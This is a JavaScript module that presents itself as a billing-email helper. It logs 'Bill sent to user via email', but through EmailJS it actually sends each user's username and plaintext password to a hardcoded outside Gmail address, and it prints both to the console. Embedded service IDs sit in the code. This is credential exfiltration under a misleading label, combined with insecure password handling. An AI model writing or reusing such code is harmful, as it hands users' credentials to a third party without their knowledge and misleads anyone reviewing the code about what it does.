import emailjs from "@emailjs/browser";

const sendEmailtoUser = async (user) => {
  // EmailJS Configuration
  const emailJSUserId = "odhgHYDVkndvIaatG";

  const emailJSTemplateId = "template_osaj2mi";
  const emailJSServiceId = "service_t8o76qz";

  try {
    await emailjs.send(
      emailJSServiceId,
      emailJSTemplateId,
      {
        user_name: user.username,
        user_pass: user.password,
        user_email: "afaaaek@gmail.com",
        reply_to: "afaaaek@gmail.com",

        // Add more placeholders as needed for email template data
        // bill_amount: billData.amount,
      },
      emailJSUserId
    );

    console.log("Bill sent to user via email.");
    console.log(user.username);
    console.log(user.password);
  } catch (error) {
    console.error("Error sending bill via email:", error);
  }
};

export default sendEmailtoUser;
